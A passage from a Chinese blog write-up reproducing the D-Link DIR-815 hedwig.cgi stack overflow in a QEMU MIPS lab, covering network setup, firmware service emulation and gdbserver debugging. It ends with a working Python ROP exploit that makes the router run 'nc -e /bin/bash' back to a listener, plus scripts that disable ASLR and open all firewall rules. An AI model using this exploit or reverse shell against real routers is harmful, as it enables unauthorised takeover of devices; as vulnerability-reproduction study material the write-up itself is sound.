<span class="string">&quot;用法：<span class="variable">$0</span> [0|1]&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;  0 - 使用 interfaces.brk 配置&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;  1 - 使用 interfaces.brk2 配置&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="comment"># 非法参数报错</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;错误：无效参数 &#x27;<span class="variable">$1</span>&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;支持的参数：0 或 1&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>在 <code>/etc/qemu-ifup</code> 文件中写入下面内容(如果没有则需要创建，然后使用 <code>sudo chmod a+x /etc/qemu-ifup</code>)<br>注意是<code>写入</code>，<code>不是</code>改成下面内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo <span class="string">&quot;Executing /etc/qemu-ifup&quot;</span></span><br><span class="line">echo <span class="string">&quot;Bringing up $1 for bridge mode...&quot;</span></span><br><span class="line">sudo /sbin/ifconfig $<span class="number">1</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> promisc up</span><br><span class="line">echo <span class="string">&quot;Adding $1 to br0...&quot;</span></span><br><span class="line">sudo /sbin/brctl addif br0 $<span class="number">1</span></span><br><span class="line">sleep <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>还需要<code>开启物理机的转发功能</code>(写成脚本如下)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD <span class="number">1</span> -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD <span class="number">1</span> -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>这里做完之后可以使用指令 <code>ip addr</code> 来查看一下虚拟网卡是否已经准备就绪</p>
<p>然后在到<code>/etc</code>文件中创建一个 <code>/qemu/bridge.conf</code> 在这个文件中写入 <code>allow br0</code></p>
<p>所有东西成功后进行保存，然后<code>重启我们的Ubuntu系统</code></p>
<h3 id="step3-配置qemu虚拟机网络设置"><a href="#step3-配置qemu虚拟机网络设置" class="headerlink" title="step3 配置qemu虚拟机网络设置"></a><strong>step3 配置qemu虚拟机网络设置</strong></h3><p>我们在第一步已经下载好了我们所需要的 <code>内核</code> 及 <code>镜像</code><br>下面我们进入存放它们的文件夹，并且创建下面这个脚本然后运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure>
<p>执行后会出现一个黑色小窗口，然后里面在加载程序，最后可能会有一个 <code>fail</code> 但是不要紧，不影响我们复现漏洞，太多 <code>fail</code> 可能就有点问题了需要问AI检查一下</p>
<p><code>qemu</code> 启动的虚拟机初始密码为 <code>root/root</code></p>
<p>进入之后第一步需要使用 <code>nano</code> 来修改 <code>/etc/network/interfaces</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p>修改其中的 <code>eth0</code> 为 <code>eth1</code><br>也就是下面部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"><span class="meta"># and how to activate them. For more information, see interfaces(5).</span></span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line"><span class="keyword">auto</span> lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug eth1</span><br><span class="line">iface eth1 inet dhcp</span><br></pre></td></tr></table></figure>
<p><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/53.png"></p>
<p>修改之后执行 <code>ifup eth1</code> 启用eth1接口， 然后我们再使用 <code>ip addr</code> 指令，会有类似下面的输出，从这里获得qemu虚拟机的ip地址，同理在Ubuntu物理机上使用这个 <code>ip addr</code> 指令同样可以得到Ubuntu物理机的ip地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc pfifo_fast state UNKNOWN qlen <span class="number">1000</span></span><br><span class="line">    link/ether <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">192.168</span>.xxx.xxx/<span class="number">24</span> brd <span class="number">192.168</span>.xx.xx scope global eth1</span><br></pre></td></tr></table></figure>

<p>执行 <code>ifup eth1</code> 后我们就可以用Ubuntu物理机来连接我们的qumu虚拟机了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">ssh root@<span class="number">192.168</span>.xx.xx</span><br><span class="line"></span><br><span class="line"># 高版本Ubutnu</span><br><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@<span class="number">192.168</span>.xx.xx</span><br></pre></td></tr></table></figure>

<h3 id="step4-开启环境"><a href="#step4-开启环境" class="headerlink" title="step4 开启环境"></a><strong>step4 开启环境</strong></h3><p>然后将在Ubunut物理机上使用scp指令来向qemu虚拟机传输文件<br>将路由器文件分解得到的 <code>/squashfs-root</code> 文件传入到 qemu虚拟机的 <code>/root</code> 文件夹下面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">scp -r ./squashfs-root root@<span class="number">192.168</span>.xx.xx:/root/</span><br><span class="line">scp -r &lt;本地Ubuntu文件地址&gt; root@<span class="number">192.168</span>.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br><span class="line"></span><br><span class="line"># 高版本Ubuntu</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r ./squashfs-root root@<span class="number">192.168</span>.xx.xx:/root/</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r &lt;本地Ubuntu文件地址&gt; root@<span class="number">192.168</span>.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br></pre></td></tr></table></figure>

<p>在qemu虚拟机的 <code>/squashfs-root</code> 文件中使用 <code>nano指令</code> 创建一个 <code>http_conf</code> 文件用于开启httpd服务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask <span class="number">026</span></span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启<span class="built_in">log</span></span><br><span class="line">ErrorLog /<span class="built_in">log</span> <span class="meta">#log文件</span></span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections <span class="number">15</span></span><br><span class="line">    BufSize <span class="number">12288</span></span><br><span class="line">    InputBufSize <span class="number">4096</span></span><br><span class="line">    ScriptBufSize <span class="number">4096</span></span><br><span class="line">    NumHeaders <span class="number">100</span></span><br><span class="line">    Timeout <span class="number">60</span></span><br><span class="line">    ScriptTimeout <span class="number">60</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; <span class="built_in">map</span> &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth1                          #对应qemu仿真路由器系统的网卡(如果是按照上面操作来的话就不用改)</span><br><span class="line">    Address <span class="number">192.168</span>.xx.xx                   <span class="meta">#qemu仿真路由器系统的IP(需要改成自己的qemu虚拟机ip地址)</span></span><br><span class="line">    Port <span class="string">&quot;1234&quot;</span>                             #对应未被使用的端口(一般也是不用改)</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行路由器程序执行下面脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#init.sh</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc<span class="number">-0.9</span><span class="number">.30</span><span class="number">.1</span>.so  /lib/</span><br><span class="line">cp lib/libcrypt<span class="number">-0.9</span><span class="number">.30</span><span class="number">.1</span>.so  /lib/</span><br><span class="line">cp lib/libc.so<span class="number">.0</span>  /lib/</span><br><span class="line">cp lib/libgcc_s.so<span class="number">.1</span>  /lib/</span><br><span class="line">cp lib/ld-uClibc.so<span class="number">.0</span>  /lib/</span><br><span class="line">cp lib/libcrypt.so<span class="number">.0</span>  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc<span class="number">-0.9</span><span class="number">.30</span><span class="number">.1</span>.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>
<p>运行之后我们可以用Ubuntu自带的浏览器去访问<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/54.png"></p>
<p>结束服务准备退出需要还原qemu虚拟机的系统架构，否则会导致qemu虚拟机损坏退出后无法开机，执行下面脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#fin.sh</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure>

<p>调试的话需要用到 <code>gdbserver</code><br>下面这个是github项目，已经编译完成的程序(但是作者好像命名错误了把mipsel打成了mipsle， 所以如果使用这个下面的脚本也需要改一改)<br><a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">embedded-tools&#x2F;binaries&#x2F;gdbserver at master · rapid7&#x2F;embedded-tools</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#run.sh</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=<span class="string">&quot;10&quot;</span></span><br><span class="line">export CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">export HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line">export REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line">export REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line">echo <span class="string">&quot;User=pwner&quot;</span>|./gdbserver.mipsel <span class="number">192.168</span>.xx.xx:<span class="number">6666</span> /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>
<p>对于这个run.sh脚本我有些疑问，winmt师傅在博客中说这里的ip地址需要填Ubuntu物理机的地址，但是我尝试之后失败了，我改为填写qemu虚拟机的地址然后运行，用Ubuntu虚拟机使用 <code>target remote &lt;qemu虚拟机ip地址&gt;:6666</code> 却可以连接成功，不知道为什么，但是没关系，只要能连上调试就行了</p>
<p>这里设置qemu虚拟机的的ip地址以及端口，之后我们同样可以使用上面的gdb脚本来进行连接</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># mygdb.sh</span></span><br><span class="line"><span class="built_in">set</span> architecture mips </span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> detach-on-fork off </span><br><span class="line">file &lt;调试文件地址&gt;               # 可以不要</span><br><span class="line">target remote <span class="number">192.168</span>.xx.xx:<span class="number">6666</span>  </span><br></pre></td></tr></table></figure>

<p>我们需要调试来确定远程的libc_base</p>
<p>这里我们只需要运行上面的 <code>init.sh</code>，打开浏览器确认服务开启后，然后运行脚本 <code>run.sh</code> ，随后在Ubuntu虚拟机中使用 <code>gdb-multiarch</code>  去连接即可<br>远程我们可以直接使用vmmap来查看libc基地址， 得到基地址为 <code>0x77f34000</code> 如果我们使用的内核和镜像相同，那么我们的libc基地址基本上也是相同的<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/55.png"></p>
<p>打qemu虚拟机想要拿到shell就需要利用到反弹shell，我们需要在Ubutnu虚拟机中开启一个终端用于接收反弹shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>下面构建exp脚本，攻击<code>192.168.xx.xx:1234</code>使其执行 <code>system(&#39;nc -e /bin/bash 192.168.xx.xxx 8888&#39;)</code> 注意这里是Ubuntu物理机的IP</p>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.xx.xxx 8888&#x27;</span> <span class="comment"># 这里是Ubuntu物理机的地址</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.xx.xx:1234/hedwig.cgi&quot;</span> <span class="comment"># 这里是qemu虚拟机的地址</span></span><br><span class="line">data = &#123;<span class="string">&quot;XiDP&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;10&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>然后我们就可以在我们执行 <code>nc -lvnp 8888</code> 的终端拿到shell了，当然前提是exp无误</p>
<p>成功打通如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/56.png"></p>
<p>参考:<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17924">DIR-815 栈溢出漏洞-先知社区</a><br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17315">firmAE模拟仿真DIR815栈溢出漏洞复现-先知社区</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiDP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/">http://example.com/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">XiDP</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a><a class="post-meta__tags" href="/tags/CVE/">CVE</a><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a></div><div class="post-share"><div class="social-share" data-image="/img/Qhead.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/13/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="非栈上格式化字符串的利用方法"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">非栈上格式化字符串的利用方法</div></div><div class="info-2"><div class="info-item-1">前言本文以第六届强网拟态线下赛的格式化字符串Pwn题为例，分享非栈上格式化字符串的利用方法。主要涵盖两个关键技术点：   多级指针链利用：当格式化字符串不在栈上时，通过修改栈上现有的多级指针链（二重&#x2F;三重指针）来间接控制目标内存  高位截断技术：当前期输出字符数已超过后期需求值时，利用0x10000溢出特性实现单字节精确写入  同时探讨为何不能在同一条指针链上使用 $ 符号进行连续修改的问题，并提出个人结论（如有错误希望师傅们指出）。 通过网盘分享的文件：第六届强网拟态fmt.rar链接: https://pan.baidu.com/s/19-fAYm0DuEhkSO7SzlJLAg?pwd=xidp 提取码: xidp 第六届强网拟态线下赛的格式化字符串 程序逻辑很简单，白给一个stack的地址，然后给一个非栈上格式化字符串的机会，最后没办法控制main函数的返回地址，因为是直接使用exit退出 显而易见的我们遇到了两个问题:  首先我们的 buf 不在栈上，没办法随意在栈中写入我们想要的地址然后去修改 其次我们只有一次机会  首先来看看如果是 非栈上的格式化字符串...</div></div></div></a><a class="pagination-related" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CVE-2017-17215 华为HG532路由器RCE漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞描述CVE-2017-17215是CheckPoint团队披露的远程命令执行（RCE）漏洞，存在于华为HG532路由器中。该设备支持名为DeviceUpgrade的一种服务类型，可通过向/ctrlt/DeviceUpgrade_1的地址提交请求，来执行固件的升级操作。可通过向37215端口发送数据包，启用UPnP协议服务，并利用该漏洞，在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。 漏洞披露:https://research.checkpoint.com/2017/good-zero-day-skiddie/ 附件下载:通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin链接: https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp 提取码: xidp 漏洞分析根据官方的漏洞报告，我们知道漏洞存在于/bin/upnp二进制文件按照官方报告中提到的 NewStatusURL 或 NewDownloadURL...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" 